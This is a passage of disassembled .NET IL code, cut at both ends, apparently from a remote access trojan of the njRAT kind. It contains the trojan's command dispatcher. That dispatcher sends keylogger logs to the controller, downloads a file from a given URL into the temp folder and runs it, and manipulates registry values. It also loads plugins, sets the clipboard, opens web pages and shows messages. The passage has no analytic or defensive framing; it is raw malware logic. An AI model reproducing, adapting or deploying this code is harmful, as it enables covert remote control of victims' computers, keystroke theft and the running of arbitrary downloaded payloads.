             class [System.Drawing]System.Drawing.Bitmap V_29,
             class [mscorlib]System.IO.MemoryStream V_30,
             class [mscorlib]System.IO.MemoryStream V_31,
             string V_32,
             valuetype [System.Drawing]System.Drawing.Rectangle V_33,
             class [mscorlib]System.Exception V_34,
             class AntiTaskManager V_35,
             native int V_36,
             int32 V_37,
             int32 V_38,
             native int V_39,
             int32 V_40,
             int32 V_41,
             native int V_42,
             int32 V_43,
             int32 V_44,
             native int V_45,
             int32 V_46,
             int32 V_47,
             native int V_48,
             int32 V_49,
             int32 V_50,
             class [mscorlib]System.Exception V_51,
             native int V_52,
             int32 V_53,
             int32 V_54,
             int32 V_55,
             int32 V_56,
             native int V_57,
             class [mscorlib]System.Exception V_58,
             class [mscorlib]System.Exception V_59,
             class [mscorlib]System.Exception V_60,
             class [mscorlib]System.Exception V_61,
             int32 V_62,
             class [mscorlib]System.Exception V_63,
             class [mscorlib]System.Exception V_64,
             class [mscorlib]System.Exception V_65,
             class [mscorlib]System.Exception V_66,
             object[] V_67,
             bool[] V_68,
             int32 V_69,
             int32 V_70,
             class [mscorlib]System.Exception V_71,
             class [mscorlib]System.Exception V_72,
             class [mscorlib]System.Exception V_73)
    IL_0000:  ldarga.s   b
    IL_0002:  call       string j.OK::BS(uint8[]&)
    IL_0007:  ldsfld     string j.OK::Y
    IL_000c:  ldc.i4.m1
    IL_000d:  ldc.i4.0
    IL_000e:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0013:  stloc.0
    .try
    {
      IL_0014:  ldloc.0
      IL_0015:  ldc.i4.0
      IL_0016:  ldelem.ref
      IL_0017:  stloc.2
      IL_0018:  ldloc.2
      IL_0019:  call       uint32 '<PrivateImplementationDetails>'::ComputeStringHash(string)
      IL_001e:  stloc.s    V_8
      IL_0020:  ldloc.s    V_8
      IL_0022:  ldc.i4     0x53118efb
      IL_0027:  bgt.un.s   IL_0063

      IL_0029:  ldloc.s    V_8
      IL_002b:  ldc.i4     0x433cfaf2
      IL_0030:  bgt.un.s   IL_004c

      IL_0032:  ldloc.s    V_8
      IL_0034:  ldc.i4     0x24f208e4
      IL_0039:  beq        IL_0143

      IL_003e:  ldloc.s    V_8
      IL_0040:  ldc.i4     0x433cfaf2
      IL_0045:  beq.s      IL_00bf

      IL_0047:  br         IL_030e

      IL_004c:  ldloc.s    V_8
      IL_004e:  ldc.i4     0x4531c525
      IL_0053:  beq.s      IL_00a9

      IL_0055:  ldloc.s    V_8
      IL_0057:  ldc.i4     0x53118efb
      IL_005c:  beq.s      IL_00d5

      IL_005e:  br         IL_030e

      IL_0063:  ldloc.s    V_8
      IL_0065:  ldc.i4     0xa8db785e
      IL_006a:  bgt.un.s   IL_0086

      IL_006c:  ldloc.s    V_8
      IL_006e:  ldc.i4     0x5a460ba4
      IL_0073:  beq        IL_012d

      IL_0078:  ldloc.s    V_8
      IL_007a:  ldc.i4     0xa8db785e
      IL_007f:  beq.s      IL_00eb

      IL_0081:  br         IL_030e

      IL_0086:  ldloc.s    V_8
      IL_0088:  ldc.i4     0xab7c95e2
      IL_008d:  beq.s      IL_0101

      IL_008f:  ldloc.s    V_8
      IL_0091:  ldc.i4     0xd5c457c6
      IL_0096:  beq.s      IL_0117

      IL_0098:  ldloc.s    V_8
      IL_009a:  ldc.i4     0xef3e349a
      IL_009f:  beq        IL_0159

      IL_00a4:  br         IL_030e

      IL_00a9:  ldloc.2
      IL_00aa:  ldstr      "ll"
      IL_00af:  ldc.i4.0
      IL_00b0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00b5:  brfalse    IL_016f

      IL_00ba:  br         IL_030e

      IL_00bf:  ldloc.2
      IL_00c0:  ldstr      "kl"
      IL_00c5:  ldc.i4.0
      IL_00c6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00cb:  brfalse    IL_017a

      IL_00d0:  br         IL_030e

      IL_00d5:  ldloc.2
      IL_00d6:  ldstr      "clip"
      IL_00db:  ldc.i4.0
      IL_00dc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00e1:  brfalse    IL_01a3

      IL_00e6:  br         IL_030e

      IL_00eb:  ldloc.2
      IL_00ec:  ldstr      "fun"
      IL_00f1:  ldc.i4.0
      IL_00f2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_00f7:  brfalse    IL_01b3

      IL_00fc:  br         IL_030e

      IL_0101:  ldloc.2
      IL_0102:  ldstr      "spech"
      IL_0107:  ldc.i4.0
      IL_0108:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_010d:  brfalse    IL_01c3

      IL_0112:  br         IL_030e

      IL_0117:  ldloc.2
      IL_0118:  ldstr      "webs"
      IL_011d:  ldc.i4.0
      IL_011e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0123:  brfalse    IL_0206

      IL_0128:  br         IL_030e

      IL_012d:  ldloc.2
      IL_012e:  ldstr      "setcl"
      IL_0133:  ldc.i4.0
      IL_0134:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0139:  brfalse    IL_0222

      IL_013e:  br         IL_030e

      IL_0143:  ldloc.2
      IL_0144:  ldstr      "message"
      IL_0149:  ldc.i4.0
      IL_014a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_014f:  brfalse    IL_0242

      IL_0154:  br         IL_030e

      IL_0159:  ldloc.2
      IL_015a:  ldstr      "prof"
      IL_015f:  ldc.i4.0
      IL_0160:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0165:  brfalse    IL_0271

      IL_016a:  br         IL_030e

      IL_016f:  ldc.i4.0
      IL_0170:  stsfld     bool j.OK::Cn
      IL_0175:  leave      IL_2a86

      IL_017a:  ldstr      "kl"
      IL_017f:  ldsfld     string j.OK::Y
      IL_0184:  ldsfld     class j.kl j.OK::kq
      IL_0189:  ldflda     string j.kl::Logs
      IL_018e:  call       string j.OK::ENB(string&)
      IL_0193:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0198:  call       bool j.OK::Send(string)
      IL_019d:  pop
      IL_019e:  leave      IL_2a86

      IL_01a3:  ldstr      "clip"
      IL_01a8:  call       bool j.OK::Send(string)
      IL_01ad:  pop
      IL_01ae:  leave      IL_2a86

      IL_01b3:  ldstr      "fun"
      IL_01b8:  call       bool j.OK::Send(string)
      IL_01bd:  pop
      IL_01be:  leave      IL_2a86

      IL_01c3:  ldstr      "SAPI.spvoice"
      IL_01c8:  ldstr      ""
      IL_01cd:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_01d2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01d7:  ldnull
      IL_01d8:  ldstr      "speak"
      IL_01dd:  ldc.i4.1
      IL_01de:  newarr     [mscorlib]System.Object
      IL_01e3:  dup
      IL_01e4:  ldc.i4.0
      IL_01e5:  ldc.i4.1
      IL_01e6:  newarr     [mscorlib]System.String
      IL_01eb:  dup
      IL_01ec:  ldc.i4.0
      IL_01ed:  ldloc.0
      IL_01ee:  ldc.i4.1
      IL_01ef:  ldelem.ref
      IL_01f0:  stelem.ref
      IL_01f1:  call       string [mscorlib]System.String::Concat(string[])
      IL_01f6:  stelem.ref
      IL_01f7:  ldnull
      IL_01f8:  ldnull
      IL_01f9:  ldnull
      IL_01fa:  ldc.i4.1
      IL_01fb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0200:  pop
      IL_0201:  br         IL_030e

      IL_0206:  ldc.i4.1
      IL_0207:  newarr     [mscorlib]System.String
      IL_020c:  dup
      IL_020d:  ldc.i4.0
      IL_020e:  ldloc.0
      IL_020f:  ldc.i4.1
      IL_0210:  ldelem.ref
      IL_0211:  stelem.ref
      IL_0212:  call       string [mscorlib]System.String::Concat(string[])
      IL_0217:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_021c:  pop
      IL_021d:  br         IL_030e

      IL_0222:  nop
      .try
      {
        IL_0223:  ldloc.0
        IL_0224:  ldc.i4.1
        IL_0225:  ldelem.ref
        IL_0226:  call       void [System.Windows.Forms]System.Windows.Forms.Clipboard::SetText(string)
        IL_022b:  leave      IL_030e

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0230:  dup
        IL_0231:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0236:  stloc.s    V_9
        IL_0238:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_023d:  leave      IL_030e

      }  // end handler
      IL_0242:  ldc.i4.1
      IL_0243:  newarr     [mscorlib]System.String
      IL_0248:  dup
      IL_0249:  ldc.i4.0
      IL_024a:  ldloc.0
      IL_024b:  ldc.i4.1
      IL_024c:  ldelem.ref
      IL_024d:  stelem.ref
      IL_024e:  call       string [mscorlib]System.String::Concat(string[])
      IL_0253:  ldc.i4.s   16
      IL_0255:  ldc.i4.1
      IL_0256:  newarr     [mscorlib]System.String
      IL_025b:  dup
      IL_025c:  ldc.i4.0
      IL_025d:  ldloc.0
      IL_025e:  ldc.i4.2
      IL_025f:  ldelem.ref
      IL_0260:  stelem.ref
      IL_0261:  call       string [mscorlib]System.String::Concat(string[])
      IL_0266:  call       valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxResult [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::MsgBox(object,
                                                                                                                                                                valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.MsgBoxStyle,
                                                                                                                                                                object)
      IL_026b:  pop
      IL_026c:  leave      IL_2a86

      IL_0271:  ldloc.0
      IL_0272:  ldc.i4.1
      IL_0273:  ldelem.ref
      IL_0274:  stloc.s    V_10
      IL_0276:  ldloc.s    V_10
      IL_0278:  ldstr      "~"
      IL_027d:  ldc.i4.0
      IL_027e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0283:  brfalse.s  IL_02a5

      IL_0285:  ldloc.s    V_10
      IL_0287:  ldstr      "!"
      IL_028c:  ldc.i4.0
      IL_028d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0292:  brfalse.s  IL_02b4

      IL_0294:  ldloc.s    V_10
      IL_0296:  ldstr      "@"
      IL_029b:  ldc.i4.0
      IL_029c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02a1:  brfalse.s  IL_0301

      IL_02a3:  br.s       IL_0309

      IL_02a5:  ldloc.0
      IL_02a6:  ldc.i4.2
      IL_02a7:  ldelem.ref
      IL_02a8:  ldloc.0
      IL_02a9:  ldc.i4.3
      IL_02aa:  ldelem.ref
      IL_02ab:  ldc.i4.1
      IL_02ac:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_02b1:  pop
      IL_02b2:  br.s       IL_0309

      IL_02b4:  ldloc.0
      IL_02b5:  ldc.i4.2
      IL_02b6:  ldelem.ref
      IL_02b7:  ldloc.0
      IL_02b8:  ldc.i4.3
      IL_02b9:  ldelem.ref
      IL_02ba:  ldc.i4.1
      IL_02bb:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_02c0:  pop
      IL_02c1:  ldstr      "getvalue"
      IL_02c6:  ldsfld     string j.OK::Y
      IL_02cb:  ldloc.0
      IL_02cc:  ldc.i4.1
      IL_02cd:  ldelem.ref
      IL_02ce:  ldsfld     string j.OK::Y
      IL_02d3:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_02d8:  ldloc.0
      IL_02d9:  ldc.i4.1
      IL_02da:  ldelem.ref
      IL_02db:  ldstr      ""
      IL_02e0:  call       object j.OK::GTV(string,
                                            object)
      IL_02e5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_02ea:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_02ef:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_02f4:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_02f9:  call       bool j.OK::Send(string)
      IL_02fe:  pop
      IL_02ff:  br.s       IL_0309

      IL_0301:  ldloc.0
      IL_0302:  ldc.i4.2
      IL_0303:  ldelem.ref
      IL_0304:  call       void j.OK::DLV(string)
      IL_0309:  leave      IL_2a86

      IL_030e:  ldloc.2
      IL_030f:  ldstr      "rn"
      IL_0314:  ldc.i4.0
      IL_0315:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_031a:  brtrue     IL_04cc

      IL_031f:  ldloc.0
      IL_0320:  ldc.i4.2
      IL_0321:  ldelem.ref
      IL_0322:  ldc.i4.0
      IL_0323:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0328:  ldc.i4.s   31
      IL_032a:  bne.un     IL_03b2

      .try
      {
        IL_032f:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0334:  ldloc.0
        IL_0335:  ldc.i4.0
        IL_0336:  ldelem.ref
        IL_0337:  ldsfld     string j.OK::Y
        IL_033c:  ldloc.0
        IL_033d:  ldc.i4.1
        IL_033e:  ldelem.ref
        IL_033f:  ldsfld     string j.OK::Y
        IL_0344:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0349:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_034e:  stloc.s    V_11
        IL_0350:  dup
        IL_0351:  ldarg.0
        IL_0352:  ldloc.s    V_11
        IL_0354:  ldarg.0
        IL_0355:  ldlen
        IL_0356:  conv.i4
        IL_0357:  ldloc.s    V_11
        IL_0359:  sub.ovf
        IL_035a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_035f:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0364:  call       uint8[] j.OK::ZIP(uint8[])
        IL_0369:  stloc.1
        IL_036a:  leave      IL_0407

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_036f:  dup
        IL_0370:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0375:  stloc.s    V_12
        IL_0377:  ldloc.s    V_12
        IL_0379:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_037e:  ldstr      "MSG"
        IL_0383:  ldsfld     string j.OK::Y
        IL_0388:  ldstr      "Execute ERROR"
        IL_038d:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0392:  call       bool j.OK::Send(string)
        IL_0397:  pop
        IL_0398:  ldstr      "bla"
        IL_039d:  call       bool j.OK::Send(string)
        IL_03a2:  pop
        IL_03a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03a8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03ad:  leave      IL_2a86

      }  // end handler
      IL_03b2:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_03b7:  stloc.3
      .try
      {
        IL_03b8:  ldloc.3
        IL_03b9:  ldloc.0
        IL_03ba:  ldc.i4.2
        IL_03bb:  ldelem.ref
        IL_03bc:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_03c1:  stloc.1
        IL_03c2:  leave.s    IL_0407

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_03c4:  dup
        IL_03c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03ca:  stloc.s    V_13
        IL_03cc:  ldloc.s    V_13
        IL_03ce:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03d3:  ldstr      "MSG"
        IL_03d8:  ldsfld     string j.OK::Y
        IL_03dd:  ldstr      "Download ERROR"
        IL_03e2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_03e7:  call       bool j.OK::Send(string)
        IL_03ec:  pop
        IL_03ed:  ldstr      "bla"
        IL_03f2:  call       bool j.OK::Send(string)
        IL_03f7:  pop
        IL_03f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0402:  leave      IL_2a86

      }  // end handler
      IL_0407:  ldstr      "bla"
      IL_040c:  call       bool j.OK::Send(string)
      IL_0411:  pop
      IL_0412:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.VBMath::Randomize()
      IL_0417:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_041c:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_0421:  stloc.s    V_14
      IL_0423:  ldloca.s   V_14
      IL_0425:  constrained. [mscorlib]System.Guid
      IL_042b:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0430:  ldstr      "-"
      IL_0435:  ldstr      ""
      IL_043a:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_043f:  ldstr      "."
      IL_0444:  ldloc.0
      IL_0445:  ldc.i4.1
      IL_0446:  ldelem.ref
      IL_0447:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_044c:  stloc.s    V_4
      .try
      {
        IL_044e:  ldloc.s    V_4
        IL_0450:  ldloc.1
        IL_0451:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0456:  ldloc.s    V_4
        IL_0458:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_045d:  pop
        IL_045e:  ldstr      "MSG"
        IL_0463:  ldsfld     string j.OK::Y
        IL_0468:  ldstr      "Executed As "
        IL_046d:  ldloc.s    V_4
        IL_046f:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0474:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0479:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_047e:  call       bool j.OK::Send(string)
        IL_0483:  pop
        IL_0484:  leave      IL_2a86

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0489:  dup
        IL_048a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_048f:  stloc.s    V_15
        IL_0491:  ldloc.s    V_15
        IL_0493:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0498:  ldloc.s    V_15
        IL_049a:  stloc.s    V_16
        IL_049c:  ldstr      "MSG"
        IL_04a1:  ldsfld     string j.OK::Y
        IL_04a6:  ldstr      "Execute ERROR "
        IL_04ab:  ldloc.s    V_16
        IL_04ad:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_04b2:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_04b7:  call       bool j.OK::Send(string)
        IL_04bc:  pop
        IL_04bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_04c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_04c7:  leave      IL_2a86

      }  // end handler
      IL_04cc:  ldloc.2
      IL_04cd:  ldstr      "inv"
      IL_04d2:  ldc.i4.0
      IL_04d3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04d8:  brfalse.s  IL_0512

      IL_04da:  ldloc.2
      IL_04db:  ldstr      "ret"
      IL_04e0:  ldc.i4.0
      IL_04e1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04e6:  brfalse    IL_0743

      IL_04eb:  ldloc.2
      IL_04ec:  ldstr      "CAP"
      IL_04f1:  ldc.i4.0
      IL_04f2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04f7:  brfalse    IL_08b4

      IL_04fc:  ldloc.2
      IL_04fd:  ldstr      "un"
      IL_0502:  ldc.i4.0
      IL_0503:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0508:  brfalse    IL_0a56

      IL_050d:  br         IL_2670

      IL_0512:  ldloc.0
      IL_0513:  ldc.i4.1
      IL_0514:  ldelem.ref
      IL_0515:  ldc.i4.0
      IL_0516:  newarr     [mscorlib]System.Byte
      IL_051b:  call       object j.OK::GTV(string,
                                            object)
      IL_0520:  castclass  uint8[]
      IL_0525:  stloc.s    V_17
      IL_0527:  ldloc.0
      IL_0528:  ldc.i4.3
      IL_0529:  ldelem.ref
      IL_052a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_052f:  ldc.i4.s   10
      IL_0531:  clt
      IL_0533:  ldloc.s    V_17
      IL_0535:  ldlen
      IL_0536:  conv.i4
      IL_0537:  ldc.i4.0
      IL_0538:  ceq
      IL_053a:  and
      IL_053b:  brfalse.s  IL_057a

      IL_053d:  ldc.i4.5
      IL_053e:  newarr     [mscorlib]System.String
      IL_0543:  dup
      IL_0544:  ldc.i4.0
      IL_0545:  ldstr      "pl"
      IL_054a:  stelem.ref
      IL_054b:  dup
      IL_054c:  ldc.i4.1
      IL_054d:  ldsfld     string j.OK::Y
      IL_0552:  stelem.ref
      IL_0553:  dup
      IL_0554:  ldc.i4.2
      IL_0555:  ldloc.0
      IL_0556:  ldc.i4.1
      IL_0557:  ldelem.ref
      IL_0558:  stelem.ref
      IL_0559:  dup
      IL_055a:  ldc.i4.3
      IL_055b:  ldsfld     string j.OK::Y
      IL_0560:  stelem.ref
      IL_0561:  dup
      IL_0562:  ldc.i4.4
      IL_0563:  ldc.i4.1
      IL_0564:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0569:  stelem.ref
      IL_056a:  call       string [mscorlib]System.String::Concat(string[])
      IL_056f:  call       bool j.OK::Send(string)
      IL_0574:  pop
      IL_0575:  br         IL_073e

      IL_057a:  ldloc.0
      IL_057b:  ldc.i4.3
      IL_057c:  ldelem.ref
      IL_057d:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0582:  ldc.i4.s   10
      IL_0584:  ble.s      IL_05f3

      IL_0586:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_058b:  stloc.s    V_19
      IL_058d:  ldc.i4.6
      IL_058e:  newarr     [mscorlib]System.String
      IL_0593:  dup
      IL_0594:  ldc.i4.0
      IL_0595:  ldloc.0
      IL_0596:  ldc.i4.0
      IL_0597:  ldelem.ref
      IL_0598:  stelem.ref
      IL_0599:  dup
      IL_059a:  ldc.i4.1
      IL_059b:  ldsfld     string j.OK::Y
      IL_05a0:  stelem.ref
      IL_05a1:  dup
      IL_05a2:  ldc.i4.2
      IL_05a3:  ldloc.0
      IL_05a4:  ldc.i4.1
      IL_05a5:  ldelem.ref
      IL_05a6:  stelem.ref
      IL_05a7:  dup
      IL_05a8:  ldc.i4.3
      IL_05a9:  ldsfld     string j.OK::Y
      IL_05ae:  stelem.ref
      IL_05af:  dup
      IL_05b0:  ldc.i4.4
      IL_05b1:  ldloc.0
      IL_05b2:  ldc.i4.2
      IL_05b3:  ldelem.ref
      IL_05b4:  stelem.ref
      IL_05b5:  dup
      IL_05b6:  ldc.i4.5
      IL_05b7:  ldsfld     string j.OK::Y
      IL_05bc:  stelem.ref
      IL_05bd:  call       string [mscorlib]System.String::Concat(string[])
      IL_05c2:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_05c7:  stloc.s    V_20
      IL_05c9:  ldloc.s    V_19
      IL_05cb:  ldarg.0
      IL_05cc:  ldloc.s    V_20
      IL_05ce:  ldarg.0
      IL_05cf:  ldlen
      IL_05d0:  conv.i4
      IL_05d1:  ldloc.s    V_20
      IL_05d3:  sub.ovf
      IL_05d4:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_05d9:  ldloc.s    V_19
      IL_05db:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_05e0:  call       uint8[] j.OK::ZIP(uint8[])
      IL_05e5:  stloc.s    V_17
      IL_05e7:  ldloc.0
      IL_05e8:  ldc.i4.1
      IL_05e9:  ldelem.ref
      IL_05ea:  ldloc.s    V_17
      IL_05ec:  ldc.i4.3
      IL_05ed:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_05f2:  pop
      IL_05f3:  ldc.i4.5
      IL_05f4:  newarr     [mscorlib]System.String
      IL_05f9:  dup
      IL_05fa:  ldc.i4.0
      IL_05fb:  ldstr      "pl"
      IL_0600:  stelem.ref
      IL_0601:  dup
      IL_0602:  ldc.i4.1
      IL_0603:  ldsfld     string j.OK::Y
      IL_0608:  stelem.ref
      IL_0609:  dup
      IL_060a:  ldc.i4.2
      IL_060b:  ldloc.0
      IL_060c:  ldc.i4.1
      IL_060d:  ldelem.ref
      IL_060e:  stelem.ref
      IL_060f:  dup
      IL_0610:  ldc.i4.3
      IL_0611:  ldsfld     string j.OK::Y
      IL_0616:  stelem.ref
      IL_0617:  dup
      IL_0618:  ldc.i4.4
      IL_0619:  ldc.i4.0
      IL_061a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_061f:  stelem.ref
      IL_0620:  call       string [mscorlib]System.String::Concat(string[])
      IL_0625:  call       bool j.OK::Send(string)
      IL_062a:  pop
      IL_062b:  ldloc.s    V_17
      IL_062d:  ldstr      "A"
      IL_0632:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_0637:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_063c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0641:  stloc.s    V_18
      IL_0643:  ldloc.s    V_18
      IL_0645:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_064a:  ldnull
      IL_064b:  ldstr      "h"
      IL_0650:  ldc.i4.1
      IL_0651:  newarr     [mscorlib]System.Object
      IL_0656:  dup
      IL_0657:  ldc.i4.0
      IL_0658:  ldsfld     string j.OK::H
      IL_065d:  stelem.ref
      IL_065e:  ldnull
      IL_065f:  ldnull
      IL_0660:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_0665:  ldloc.s    V_18
      IL_0667:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_066c:  ldnull
      IL_066d:  ldstr      "p"
      IL_0672:  ldc.i4.1
      IL_0673:  newarr     [mscorlib]System.Object
      IL_0678:  dup
      IL_0679:  ldc.i4.0
